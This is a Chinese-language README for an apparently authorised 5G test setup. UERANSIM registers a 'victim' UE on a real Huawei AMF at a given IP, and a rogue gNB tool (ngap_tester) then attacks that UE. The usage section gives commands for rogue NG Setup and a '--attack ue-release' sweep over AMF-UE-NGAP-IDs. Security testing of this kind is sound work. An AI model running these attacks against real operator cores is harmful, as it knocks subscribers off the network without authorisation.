# real-amf —— UERANSIM 合法 gNB+UE，连真实华为 AMF

这套让 **UERANSIM 做“合法 gNB + 合法 UE”**直连真实华为 AMF（`14.55.2.5`），让一个
真实 UE 完成 **5G-AKA 认证 + 注册 + PDU 会话**。有了这个已注册的“受害 UE”，再用同目录
上一层的 **ngap_tester（流氓 gNB）**去打它。

拓扑：合法 gNB(UERANSIM) 和 流氓 gNB(ngap_tester) 是**同一个华为 AMF 上的两个不同 gNB**。

```
        ┌──────────── 镜像网络 WSL2 Ubuntu (测试机) ────────────┐
        │  UERANSIM nr-gnb ──NGAP/SCTP──┐                        │
        │  UERANSIM nr-ue  ──RLS(UDP)───┘   ngap_tester ─SCTP─┐  │
        └───────────────────────────────────┼────────────────┼──┘
                                             ▼                ▼
                                   真实华为 AMF 14.55.2.5:38412（同一个 AMF）
```

## 前置
1. **镜像网络**：`%USERPROFILE%\.wslconfig` 设 `networkingMode=mirrored`（见 `../wslconfig-mirrored.txt`），`wsl --shutdown`。否则 SCTP 出不去。
2. **环境**：先在 `ngap_tester/` 目录跑 `./deploy/bootstrap.sh`（装依赖 + 编译 UERANSIM + 建 venv）。
3. **凭据开户**：`real-amf.env` 里的 UE 凭据必须已被华为核心网 UDM/AUSF 开户，否则认证失败。

## 用法（都在 `ngap_tester/` 目录下）
```bash
# 1) 填参数
nano deploy/real-amf/real-amf.env        # PLMN/TAC/切片/DNN/凭据；AMF_ADDR 默认 14.55.2.5

# 2) 起合法 gNB（终端 A）—— 对华为发 NG Setup
./deploy/real-amf/run-gnb.sh
#    看到 "NG Setup procedure is successful" 即被 AMF 接受

# 3) 起合法 UE（终端 B）—— 触发认证 + 注册 + 建会话
./deploy/real-amf/run-ue.sh
#    看到 "Registration is successful" + "PDU Session establishment is successful"，出现 uesimtun0

# 4) 验证数据面（可选）
ping -I uesimtun0 8.8.8.8                 # 或华为侧给的可达地址
```
此时华为 AMF 上就有了一个真实注册、CM-CONNECTED 的受害 UE。

## 接着用 ngap_tester 打它
见 `../部署指南_华为AMF.md` 的“流氓 gNB 攻击”一节；关键命令：
```bash
./deploy/ngt.sh sctp-ping          # L4 可达性
./deploy/ngt.sh ng-setup           # 流氓 gNB 被 AMF 接受（gnb_id 必须与 UERANSIM 不同）
./deploy/ngt.sh sweep --attack ue-release --amf-range 1-2000   # 找/打受害 AMF-UE-NGAP-ID
```

## 常见问题
- **NG Setup 被 REJECT**：PLMN/TAC/切片/gNB-ID 不匹配，或源 IP 未白名单。先 `./deploy/ngt.sh sctp-ping` 确认 L4 通。
- **UE 认证/注册失败**：凭据没在华为开户，或 K/OPc/PLMN/IMSI 前缀不一致；首次可能触发 SQN re-sync（正常）。
- **只有 lo 网卡 / 连不到 AMF**：`.wslconfig` 没进镜像模式，或宿主禁了 IPv6（镜像模式要求 IPv6 开启）。改后 `wsl --shutdown`。
- **找不到 nr-gnb/nr-ue**：没跑 `../bootstrap.sh`，或 UERANSIM 编译失败。
